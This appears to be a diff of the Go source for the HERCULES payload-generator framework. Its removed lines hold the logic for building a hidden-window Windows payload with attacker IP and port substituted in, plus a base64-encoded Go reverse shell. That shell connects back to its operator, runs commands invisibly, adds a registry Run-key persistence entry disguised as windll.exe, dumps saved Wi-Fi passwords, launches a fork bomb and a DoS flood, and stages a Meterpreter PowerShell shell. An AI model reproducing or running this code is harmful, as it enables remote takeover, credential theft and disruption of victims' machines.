- }else if strings.Contains(ARG, "-l dynamic") || strings.Contains(ARG, "-L DYNAMIC") || strings.Contains(ARG, "-l DYNAMIC") || strings.Contains(ARG, "-L dynamic") {
-  LINKER = "dynamic"
- }else if strings.Contains(ARG, "-l") {
-  color.Red("\n[-] ERROR : Invalid Linker !")
-  os.Exit(1)
- }
-
-
-
-
-  if strings.Contains(ARG, "-p windows") || strings.Contains(ARG, "-P WINDOWS") || strings.Contains(ARG, "-p Windows") || strings.Contains(ARG, "-P windows") || strings.Contains(ARG, "-p WINDOWS") || strings.Contains(ARG, "-P Windows") {
-    WINDOWS_PAYLOAD, _ := base64.StdEncoding.DecodeString(WINDOWS_PAYLOAD)
-    PAYLOAD = string(WINDOWS_PAYLOAD)
-    PAYLOAD_TYPE = "Windows"
-  }else if strings.Contains(ARG, "-p linux") || strings.Contains(ARG, "-P LINUX") || strings.Contains(ARG, "-p Linux") || strings.Contains(ARG, "-P linux") || strings.Contains(ARG, "-p LINUX") || strings.Contains(ARG, "-P Linux") {
-    LINUX_PAYLOAD, _ := base64.StdEncoding.DecodeString(LINUX_PAYLOAD)
-    PAYLOAD = string(LINUX_PAYLOAD)
-    PAYLOAD_TYPE = "Linux"
-  }else if strings.Contains(ARG, "-p") || strings.Contains(ARG, "-P") {
-    color.Red("\n[-] ERROR : Invalid Payload !")
-    os.Exit(1)
-  }else {
-    PAYLOAD_TYPE = "Windows"
-  	WINDOWS_PAYLOAD, _ := base64.StdEncoding.DecodeString(WINDOWS_PAYLOAD)
-    PAYLOAD = string(WINDOWS_PAYLOAD)
-  }
-
-
-  if strings.Contains(ARG, "--persistence") || strings.Contains(ARG, "--PERSISTENCE") || strings.Contains(ARG, "--Persistence") {
-    PERSISTENCE = true
   }else{
-    PERSISTENCE = false
+
   }
 
 
+}
 
+func CheckSetup()  (bool){
 
-  if strings.Contains(ARG, "--embed=") || strings.Contains(ARG, "--Embed=") || strings.Contains(ARG, "--EMBED=") {
-    DISPATCH = true;
-  }else{
-    DISPATCH = false;
+  DirList, _ := exec.Command("sh", "-c", "cd /usr/lib/go/src/ && ls").Output()
+  GoVer, _ := exec.Command("sh", "-c", "go version").Output()
+  UPX, _ := exec.Command("sh", "-c", "upx").Output()
+  if !(strings.Contains(string(DirList), "EGESPLOIT")) || !(strings.Contains(string(DirList), "color")) {
+    return false
   }
-
-
-
-
-
-
-//####################################################################### PARAMETER CHECKS ##############################################################//
-
-
-
-
-
-  if DISPATCH == true {
-    FileName := strings.Split(ARG, "=");
-
-    File, err := ioutil.ReadFile(FileName[1])
-    if err != nil {
-      ErrorMessage := string("[!] Unable to acces "+FileName[1])
-      color.Red(ErrorMessage)
-    }else{
-      EncodedFile := base64.StdEncoding.EncodeToString(File)
-      GENERATE_PAYLOAD(ARGS[0], ARGS[1], string(PAYLOAD), ARC, LINKER, PERSISTENCE,EncodedFile,FileName[1])
-    }
-
-  }else{
-  	GENERATE_PAYLOAD(ARGS[0], ARGS[1], string(PAYLOAD), ARC, LINKER, PERSISTENCE,"","")
+  if !(strings.Contains(string(GoVer), "version")) {
+    return false
   }
-  
-
-  color.Blue("\n\n[*] Payload : "+PAYLOAD_TYPE)
-  color.Blue("\n[*] Architecture : "+ARC)
-  color.Blue("\n[*] Linker : "+LINKER)
-  if PERSISTENCE == true {
-    color.Blue("\n[*] Persistence : Enabled")  
-  }else{
-    color.Blue("\n[*] Persistence : Disabled")
+  if !(strings.Contains(string(UPX), "Markus")) {
+    return false
   }
-
-  if DISPATCH == true {
-    FileName := strings.Split(ARG, "=");
-    Info := string("\n[*] File Embeding : Payload merged with "+FileName[1])
-    color.Blue(Info)
-    Info = string("\n\n[+] Payload generated as Payload_" + FileName[1] + " at "+dir)
-    color.Green(Info)
-  }else{
-    color.Blue("\n[*] File Embeding : Disabled")
-    color.Green(string("\n\n[+] Payload generated as Payload.exe at "+dir))
-  }
-  
-   
+  return true
 }
 
 
-func GENERATE_PAYLOAD(IP string, PORT string, PAYLOAD string, ARC string, LINKER string, PERSISTENCE bool, ENCODED_FILE string, ENCODED_FILENAME string) {
+func ChecVersion()  (string){
 
-  IP = string("\""+IP+"\";")
-  PORT = string("\""+PORT+"\";")
-  Payload_Source, err := os.Create("Payload.go")
-  if err != nil {
-    fmt.Println(err)
+  Response, Error := http.Get("https://raw.githubusercontent.com/EgeBalci/HERCULES/master/SOURCE/HERCULES.go")
+  if Error != nil {
+    return "[!] ERROR : Connection attempt failed"
   }
-  runtime.GC()
-  Index := strings.Replace(PAYLOAD, "\"127.0.0.1\";", IP, -1)
-  Index = strings.Replace(Index, "\"8552\";", PORT, -1)
+  Body, _ := ioutil.ReadAll(Response.Body)
 
-  if PERSISTENCE == true {
-    Index = strings.Replace(Index, "BACKDOOR bool = false;", "BACKDOOR bool = true;", -1)
-  }
+  Version := string(`"`+VERSION+`"`)
 
-  if DISPATCH == true  {
-    Index = strings.Replace(Index, "EMBEDDED bool = false;", "EMBEDDED bool = true;", -1)
-    Index = strings.Replace(Index, "//INSERT-BINARY-HERE//", string(ENCODED_FILE), -1)
+  if !(strings.Contains(string(Body), Version)) {
+    return "[!] New version detected"
+  }else{
+    return "[+] HERCULES is up to date"
   }
 
-
-  Payload_Source.WriteString(Index)
-  runtime.GC()
-
-  if runtime.GOOS == "windows" {
-
-    if LINKER == "static" || LINKER == "STATIC" {
-      LINKER = string("set GOARCH="+ARC+"\ngo build -ldflags \"-H windowsgui\" Payload.go ")
-    }else if LINKER == "dynamic" || LINKER == "DYNAMIC" {
-      LINKER = string("set GOARCH="+ARC+"\ngo build -ldflags \"-H windowsgui -s\" Payload.go ")
-    }
-
-
-    Builder, err := os.Create("Build.bat")
-    if err != nil {
-      fmt.Println(err)
-    } 
-    Builder.WriteString(LINKER)
-    runtime.GC()
-    exec.Command("cmd", "/C", "Build.bat").Run()
-    runtime.GC()
-    exec.Command("cmd", "/C", " del Build.bat").Run()
-    runtime.GC()
-    exec.Command("cmd", "/C", "del Payload.go").Run()
-    runtime.GC()
-
-    if DISPATCH == true {
-      Temp := string("rename Payload.exe Payload_"+ENCODED_FILENAME)
-      exec.Command("cmd", "/C", Temp).Run()
-    }
-
-  }else if runtime.GOOS != "windows" {
-
-    if LINKER == "static" {
-      LINKER = string("export GOOS=windows && export GOARCH="+ARC+" && go build -ldflags \"-H windowsgui\" Payload.go && export GOOS=linux && export GOARCH=amd64")
-    }else if LINKER == "dynamic" || LINKER == "DYNAMIC" {
-      LINKER = string("export GOOS=windows && export GOARCH="+ARC+" && go build -ldflags \"-H windowsgui -s\" Payload.go && export GOOS=linux && export GOARCH=amd64")
-    }
-
-    exec.Command("sh", "-c", LINKER).Run()
-    runtime.GC()
-    exec.Command("sh", "-c", "rm Payload.go").Run()
-    if DISPATCH == true {
-      Temp := string("rename Payload_Payload.exe "+ENCODED_FILENAME)
-      exec.Command("sh", "-c", Temp).Run()
-    }
-  }
 }
 
 
+func PrintBanner()  {
+  color.Red(" ██░ ██ ▓█████  ██▀███   ▄████▄   █    ██  ██▓    ▓█████   ██████ ")
+  color.Red("▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒▒██▀ ▀█   ██  ▓██▒▓██▒    ▓█   ▀ ▒██    ▒ ")
+  color.Red("▒██▀▀██░▒███   ▓██ ░▄█ ▒▒▓█    ▄ ▓██  ▒██░▒██░    ▒███   ░ ▓██▄   ")
+  color.Red("░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄  ▒▓▓▄ ▄██▒▓▓█  ░██░▒██░    ▒▓█  ▄   ▒   ██▒")
+  color.Red("░▓█▒░██▓░▒████▒░██▓ ▒██▒▒ ▓███▀ ░▒▒█████▓ ░██████▒░▒████▒▒██████▒▒")
+  color.Red(" ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░░ ░▒ ▒  ░░▒▓▒ ▒ ▒ ░ ▒░▓  ░░░ ▒░ ░▒ ▒▓▒ ▒ ░")
+  color.Red(" ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░  ░  ▒   ░░▒░ ░ ░ ░ ░ ▒  ░ ░ ░  ░░ ░▒  ░ ░")
+  color.Red(" ░  ░░ ░   ░     ░░   ░ ░         ░░░ ░ ░   ░ ░      ░   ░  ░  ░  ")
+  color.Red(" ░  ░  ░   ░  ░   ░     ░ ░         ░         ░  ░   ░  ░      ░  ")
+  color.Red("                        ░                                         ")
+
+}
+
+func PrintCredit()  {
+  Green := color.New(color.FgGreen)
+  BoldGreen := Green.Add(color.Bold)
+  color.Green("\n+ -- --=[      HERCULES FRAMEWORK           ]")
+  color.Green("+ -- --=[         Version: "+VERSION+"            ]")
+  BoldGreen.Println("+ -- --=[            Ege Balcı              ]")
+}
 
 
-var WINDOWS_PAYLOAD string = `CnBhY2thZ2UgbWFpbgoKaW1wb3J0ICJuZXQiOwppbXBvcnQgIm9zL2V4ZWMiOwppbXBvcnQgImJ1ZmlvIjsgCmltcG9ydCAib3MiOwppbXBvcnQgInN0cmluZ3MiOwppbXBvcnQgInBhdGgvZmlsZXBhdGgiOwppbXBvcnQgInN5c2NhbGwiOwppbXBvcnQgIm5ldC9odHRwIjsKaW1wb3J0ICJ0aW1lIjsKaW1wb3J0ICJieXRlcyI7CmltcG9ydCAiY29tcHJlc3MvZmxhdGUiOwppbXBvcnQgImVuY29kaW5nL2Jhc2U2NCI7CgoKCmNvbnN0IElQIHN0cmluZyA9ICIxMjcuMC4wLjEiOwpjb25zdCBQT1JUIHN0cmluZyA9ICI4NTUyIjsKY29uc3QgQkFDS0RPT1IgYm9vbCA9IGZhbHNlOwpjb25zdCBFTUJFRERFRCBib29sID0gZmFsc2U7CmNvbnN0IFRJTUVfREVMQVkgdGltZS5EdXJhdGlvbiA9IDU7Ly9TZWNvbmQKCgoKdmFyIEdMT0JBTF9DT01NQU5EIHN0cmluZzsKdmFyIERPU19UYXJnZXQgc3RyaW5nOwp2YXIgRE9TX1JlcXVlc3RfQ291bnRlciBpbnQgPSAwOwp2YXIgRE9TX1JlcXVlc3RfTGltaXQgaW50ID0gMTAwMDsKCnZhciBJUF9QT1JUIHN0cmluZzsgLy8gRk9SIE1FVEVSUFJFVEVSCgpmdW5jIG1haW4oKSB7CgogIGlmIEVNQkVEREVEID09IHRydWUgewogICAgRElTUEFUQ0goKQogIH0KCgogIGlmIEJBQ0tET09SID09IHRydWUgewogICAgUEVSU0lTVCgpCiAgfQogICAgICAgICAgICAgICAgICAgICAgICAgIAogIGNvbm5lY3QsIGVyciA6PSBuZXQuRGlhbCgidGNwIiwgSVArIjoiK1BPUlQpOyAgICAgICAgICAgICAgICAgICAgICAgCiAgaWYgZXJyICE9IG5pbCB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIHRpbWUuU2xlZXAoVElNRV9ERUxBWSp0aW1lLlNlY29uZCk7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIG1haW4oKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICB9OyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAKICBkaXIsIF8gOj0gZmlsZXBhdGguQWJzKGZpbGVwYXRoLkRpcihvcy5BcmdzWzBdKSk7ICAgICAKICBWZXJzaW9uX0NoZWNrIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgInZlciIpOwogIFZlcnNpb25fQ2hlY2suU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICB2ZXJzaW9uLCBfIDo9IFZlcnNpb25fQ2hlY2suT3V0cHV0KCk7ICAgICAgICAgICAKICBTeXNHdWlkZSA6PSAoQkFOTkVSK3N0cmluZyh2ZXJzaW9uKSArICJcblxuIiArIHN0cmluZyhkaXIpICsgIj4iKTsgICAgICAKICBjb25uZWN0LldyaXRlKFtdYnl0ZShzdHJpbmcoU3lzR3VpZGUpKSk7ICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogCiAgCiAgZm9yIHsKICAgIAogICAgQ29tbWFuZCwgXyA6PSBidWZpby5OZXdSZWFkZXIoY29ubmVjdCkuUmVhZFN0cmluZygnXG4nKTsgICAgICAgICAgICAgICAgICAgICAgIAogICAgX0NvbW1hbmQgOj0gc3RyaW5nKENvbW1hbmQpOyAgICAgICAgICAgICAgICAgICAgICAKICAgIEdMT0JBTF9DT01NQU5EID0gX0NvbW1hbmQ7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIAoKICAgIAogICAgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5wbGVhc2UiKSB8fCBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAiflBMRUFTRSIpIHsgCiAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKFNBWV9QTEVBU0UoKSkpOwogICAgfWVsc2UgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5NRVRFUlBSRVRFUiAtQSIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+TWV0ZXJwcmV0ZXIgLWEiKSB8fCBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifm1ldGVycHJldGVyIC1hIikgewogICAgICBUZW1wX0lQX1BPUlQgOj0gc3RyaW5ncy5TcGxpdChfQ29tbWFuZCwgIlwiIikKICAgICAgSVBfUE9SVCA9IHN0cmluZyhUZW1wX0lQX1BPUlRbMV0pCiAgICAgIE1FVEVSUFJFVEVSX0NSRUFURSgpOwogICAgICBjb25uZWN0LldyaXRlKFtdYnl0ZSgiXG5cblsrXSBNZXRlcnByZXRlciBFeGVjdXRlZCAhXG5cbiIrZGlyKyI+IikpOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifkRPUyIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+ZG9zIikgewogICAgICBET1NfQ29tbWFuZCA6PSBzdHJpbmdzLlNwbGl0KEdMT0JBTF9DT01NQU5ELCAiXCIiKQogICAgICBET1NfVGFyZ2V0ID0gIERPU19Db21tYW5kWzFdCiAgICAgIGlmIHN0cmluZ3MuQ29udGFpbnMoc3RyaW5nKERPU19UYXJnZXQpLCAiaHR0cCIpIHsKICAgICAgICBnbyBET1MoKTsKICAgICAgICBjb25uZWN0LldyaXRlKFtdYnl0ZSgiXG5cblsqXSBTdGFydGluZyBET1MgYXRhY2suLi4iKyJcblxuWypdIFNlbmRpbmcgMTAwMCByZXF1ZXN0IHRvICIrRE9TX1RhcmdldCsiICFcblxuIitkaXIrIj4iKSk7CiAgICAgIH1lbHNlewogICAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKCJcblxuWy1dIEVSUk9SOiBJbnZhbGlkIHVybCAhXG5cbiIrZGlyKyI+IikpOwogICAgICB9ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgfWVsc2UgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5ESVNUUkFDVCIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+ZGlzdHJhY3QiKSB7IAogICAgICBESVNUUkFDVCgpOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifldJRkktTElTVCIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+d2lmaS1saXN0IikgeyAKICAgICAgTGlzdCA6PSBHRVRfV0lGSV9ISVNUT1JZKCk7CiAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKHN0cmluZyhMaXN0KSkpOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifkhFTFAiKSB8fCBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifmhlbHAiKSB7IAogICAgICBjb25uZWN0LldyaXRlKFtdYnl0ZShzdHJpbmcoSEVMUCtkaXIrIj4iKSkpOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgfWVsc2UgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5QRVJTSVNURU5DRSIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+cGVyc2lzdGVuY2UiKSB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICBnbyBQRVJTSVNUKCk7CiAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKCJcblxuWypdIEFkZGluZyBwZXJzaXN0ZW5jZSByZWdpc3RyaWVzLi4uXG5bKl0gUGVyc2lzdGVuY2UgQ29tcGxldGVkXG5cbiIrZGlyKyI+IikpOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgfWVsc2V7CiAgICAgIGNtZCA6PSBleGVjLkNvbW1hbmQoImNtZCIsICIvQyIsIF9Db21tYW5kKTsKICAgICAgY21kLlN5c1Byb2NBdHRyID0gJnN5c2NhbGwuU3lzUHJvY0F0dHJ7SGlkZVdpbmRvdzogdHJ1ZX07CiAgICAgIG91dCwgXyA6PSBjbWQuT3V0cHV0KCk7CiAgICAgIENvbW1hbmRfT3V0cHV0IDo9IHN0cmluZygiXG5cbiIrc3RyaW5nKG91dCkrIlxuIitzdHJpbmcoZGlyKSsiPiIpOwogICAgICBjb25uZWN0LldyaXRlKFtdYnl0ZShDb21tYW5kX091dHB1dCkpOwogICAgfTsKICB9Owp9OwoKCgoKCmZ1bmMgUEVSU0lTVCgpIHsKICBQRVJTSVNULCBfIDo9IG9zLkNyZWF0ZSgiUEVSU0lTVC5iYXQiKQoKICBQRVJTSVNULldyaXRlU3RyaW5nKCJta2RpciAlQVBQREFUQSVcXFdpbmRvd3MiKyJcbiIpCiAgUEVSU0lTVC5Xcml0ZVN0cmluZygiY29weSAiICsgb3MuQXJnc1swXSArICIgJUFQUERBVEElXFxXaW5kb3dzXFx3aW5kbGwuZXhlXG4iKQogIFBFUlNJU1QuV3JpdGVTdHJpbmcoIlJFRyBBREQgSEtDVVxcU09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93c1xcQ3VycmVudFZlcnNpb25cXFJ1biAvViBXaW5EbGwgL3QgUkVHX1NaIC9GIC9EICVBUFBEQVRBJVxcV2luZG93c1xcd2luZGxsLmV4ZSIpCgogIFBFUlNJU1QuQ2xvc2UoKQoKICBFeGVjIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgIlBFUlNJU1QuYmF0Iik7CiAgRXhlYy5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9OwogIEV4ZWMuUnVuKCk7CiAgQ2xlYW4gOj0gZXhlYy5Db21tYW5kKCJjbWQiLCAiL0MiLCAiZGVsIFBFUlNJU1QuYmF0Iik7CiAgQ2xlYW4uU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICBDbGVhbi5SdW4oKTsKCn07CgoKCmZ1bmMgU0FZX1BMRUFTRSgpIChzdHJpbmcpewogIENvbW1hbmQgOj0gc3RyaW5ncy5TcGxpdChHTE9CQUxfQ09NTUFORCwgIlwiIik7CiAgY21kIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgc3RyaW5nKCJwb3dlcnNoZWxsLmV4ZSAtQ29tbWFuZCBTdGFydC1Qcm9jZXNzIC1WZXJiIFJ1bkFzICIrc3RyaW5nKENvbW1hbmRbMV0pKSk7CiAgY21kLlN5c1Byb2NBdHRyID0gJnN5c2NhbGwuU3lzUHJvY0F0dHJ7SGlkZVdpbmRvdzogdHJ1ZX07CiAgb3V0LCBfIDo9IGNtZC5PdXRwdXQoKTsKICBDb21tYW5kX091dHB1dCA6PSBzdHJpbmcoc3RyaW5nKG91dCkpOwogIHJldHVybiBDb21tYW5kX091dHB1dDsKfTsKCgoKCmZ1bmMgRElTVFJBQ1QoKSB7CiAgdmFyIEZvcmtfQm9tYiBzdHJpbmcgPSAiOkFcbnN0YXJ0XG5nb3RvIEEiCiAgRl9Cb21iLCBfIDo9IG9zLkNyZWF0ZSgiRl9Cb21iLmJhdCIpCgogIEZfQm9tYi5Xcml0ZVN0cmluZyhGb3JrX0JvbWIpCgogIEZfQm9tYi5DbG9zZSgpCgogIGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgIkZfQm9tYi5iYXQiKS5TdGFydCgpCgp9CgoKZnVuYyBET1MoKSB7CiAgZm9yIHsKICAgIERPU19SZXF1ZXN0X0NvdW50ZXIrKwogICAgcmVzcG9uc2UsIGVyciA6PSBodHRwLkdldChET1NfVGFyZ2V0KTsKICAgIGlmIGVyciAhPSBuaWwgewogICAgICBicmVhazsKICAgIH0KICAgIHJlc3BvbnNlLkJvZHkuQ2xvc2UoKTsKICAgIGlmIERPU19SZXF1ZXN0X0NvdW50ZXIgPCBET1NfUmVxdWVzdF9MaW1pdCB7CiAgICAgIGdvIERPUygpCiAgICB9ZWxzZXsKICAgICAgYnJlYWs7CiAgICB9IAogIH0KfQoKCmZ1bmMgR0VUX1dJRklfSElTVE9SWSgpIChzdHJpbmcpIHsKICBMaXN0IDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgIm5ldHNoIHdsYW4gc2hvdyBwcm9maWxlIG5hbWU9KiBrZXk9Y2xlYXIiKTsKICBMaXN0LlN5c1Byb2NBdHRyID0gJnN5c2NhbGwuU3lzUHJvY0F0dHJ7SGlkZVdpbmRvdzogdHJ1ZX07CiAgSGlzdG9yeSwgXyA6PSBMaXN0Lk91dHB1dCgpOwoKICByZXR1cm4gc3RyaW5nKEhpc3RvcnkpOwp9CgoKCgoKZnVuYyBNRVRFUlBSRVRFUl9DUkVBVEUoKSB7CgogIHZhciBCdWZmZXIgYnl0ZXMuQnVmZmVyCiAgdmFyIFBvd2Vyc2hlbGxfUmV2ZXJzZV9IdHRwcyBzdHJpbmcgPSBSRVZFUlNFX0hUVFBTX1NIRUxMKHN0cmluZyhJUF9QT1JUKSkKCiAgRmxhdGUsIF8gOj0gZmxhdGUuTmV3V3JpdGVyKCZCdWZmZXIsNikKICBpZiBfLCBlcnIgOj0gRmxhdGUuV3JpdGUoW11ieXRlKFBvd2Vyc2hlbGxfUmV2ZXJzZV9IdHRwcykpOyBlcnIgIT0gbmlsIHsKICAgIHBhbmljKGVycikKICB9CiAgaWYgZXJyIDo9IEZsYXRlLkZsdXNoKCk7IGVyciAhPSBuaWwgewogICAgcGFuaWMoZXJyKQogIH0KICBpZiBlcnIgOj0gRmxhdGUuQ2xvc2UoKTsgZXJyICE9IG5pbCB7CiAgICBwYW5pYyhlcnIpCiAgfQoKICBCdWZmZXJTdHJpbmcgOj0gQnVmZmVyLkJ5dGVzKCkKICBFbmNvZGVkQ29tcHJlc3NlZEJ1ZmZlciA6PSBiYXNlNjQuU3RkRW5jb2RpbmcuRW5jb2RlVG9TdHJpbmcoW11ieXRlKEJ1ZmZlclN0cmluZykpCgoKICB2YXIgUFNfTWV0ZXJwcmV0ZXIgc3RyaW5nID0gQ1JFQVRFX1BTX01FVEVSUFJFVEVSKEVuY29kZWRDb21wcmVzc2VkQnVmZmVyKQoKICBGaWxlLCBfIDo9IG9zLkNyZWF0ZSgiV2luZGxsLmJhdCIpCiAgRmlsZS5Xcml0ZVN0cmluZyhQU19NZXRlcnByZXRlcikKCiAgRmlsZS5DbG9zZSgpOwoKICBUZW1wQ29tbWFuZCA6PSBzdHJpbmcoIm1vdmUgd2luZGxsLmJhdCAlIisiQVBQREFUQSIrIiUiKQoKICBNb3ZlIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgVGVtcENvbW1hbmQpOwogIE1vdmUuU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICBNb3ZlLlJ1bigpOwoKICBUZW1wQ29tbWFuZF8yIDo9IHN0cmluZygiJSIrIkFQUERBVEEiKyIlIisiXFx3aW5kbGwuYmF0IikKCiAgRXhlYyA6PSBleGVjLkNvbW1hbmQoImNtZCIsICIvQyIsIFRlbXBDb21tYW5kXzIpOwogIEV4ZWMuU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICBFeGVjLlN0YXJ0KCk7Cgp9CgoKdmFyIEJBTk5FUiBzdHJpbmcgPSBgCiAgICAgICAgICAgICAgICAgIF9fICBfX19fX19fX19fX18gIF9fX19fX19fICBfX19fICAgIF9fX19fX19fX19fCiAgICAgICAgICAgICAgICAgLyAvIC8gLyBfX19fLyBfXyBcLyBfX19fLyAvIC8gLyAvICAgLyBfX19fLyBfX18vCiAgICAgICAgICAgICAgICAvIC9fLyAvIF9fLyAvIC9fLyAvIC8gICAvIC8gLyAvIC8gICAvIF9fLyAgXF9fIFwgCiAgICAgICAgICAgICAgIC8gX18gIC8gL19fXy8gXywgXy8gL19fXy8gL18vIC8gL19fXy8gL19fXyBfX18vIC8gCiAgICAgICAgICAgICAgL18vIC9fL19fX19fL18vIHxffFxfX19fL1xfX19fL19fX19fL19fX19fLy9fX19fLyAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyBIRVJDVUxFUyBSRVZFUlNFIFNIRUxMICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKYAoKCgoKdmFyIEhFTFAgc3RyaW5nID0gYAoKICAgICAgICAgICAgICAgICAgX18gIF9fX19fX19fX19fXyAgX19fX19fX18gIF9fX18gICAgX19fX19fX19fX18KICAgICAgICAgICAgICAgICAvIC8gLyAvIF9fX18vIF9fIFwvIF9fX18vIC8gLyAvIC8gICAvIF9fX18vIF9fXy8KICAgICAgICAgICAgICAgIC8gL18vIC8gX18vIC8gL18vIC8gLyAgIC8gLyAvIC8gLyAgIC8gX18vICBcX18gXCAKICAgICAgICAgICAgICAgLyBfXyAgLyAvX19fLyBfLCBfLyAvX19fLyAvXy8gLyAvX19fLyAvX19fIF9fXy8gLyAKICAgICAgICAgICAgICAvXy8gL18vX19fX18vXy8gfF98XF9fX18vXF9fX18vX19fX18vX19fX18vL19fX18vICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIEhFUkNVTEVTIFJFVkVSU0UgU0hFTEwgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKCgp+UEVSU1NJU1RFTkNFICAgICAgICAgICAgICAgICAgICAgSW5zdGFsbHMgYSBwZXJzaXN0ZW5jZSBtb2R1bGUKCn5ESVNUUkFDVCAgICAgICAgICAgICAgICAgICAgICAgICBFeGVjdXRlcyBhIGZvcmsgYm9tYiBiYXQgZmlsZSBmb3IgZGlzdHJhY3Rpb24gICAKCn5QTEVBU0UgICJDb21tYW5kIiAgICAgICAgICAgICAgICBBc2tzIHVzZXJzIGNvbWZpcm1hdGlvbiBmb3IgaGlnaGVyIHByaXZpbGlkZ2Ugb3BlcmF0aW9ucwoKfkRPUyAtQSAid3d3LnRhcmdldHNpdGUuY29tIiAgICAgIFN0YXJ0cyBhIGRlbmlhbCBvZiBzZXJ2aWNlIGF0YWNrCgp+V0lGSS1MSVNUIAkJCQkJCSAgICAgICAgICAgIER1bXBzIGFsbCB3aWZpIGhpc3RvcnkgZGF0YSB3aXRo